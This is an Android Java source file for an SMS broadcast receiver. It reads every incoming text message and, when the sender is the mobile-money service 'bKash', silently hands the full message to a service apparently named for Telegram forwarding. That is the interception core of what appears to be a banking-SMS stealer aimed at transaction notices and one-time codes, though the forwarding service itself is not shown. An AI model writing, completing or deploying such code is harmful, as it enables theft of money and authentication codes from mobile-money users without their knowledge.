package com.example.sms_reader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                StringBuilder fullMessage = new StringBuilder();
                String sender = null;

                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    if (sender == null) {
                        sender = sms.getDisplayOriginatingAddress();
                    }
                    fullMessage.append(sms.getMessageBody());
                }


                if (sender != null && sender.equalsIgnoreCase("bKash")) {
                    Intent serviceIntent = new Intent(context, TelegramService.class);
                    serviceIntent.putExtra("sender", sender);
                    serviceIntent.putExtra("message", fullMessage.toString());
                    context.startService(serviceIntent);
                }
            }
        }
    }
}
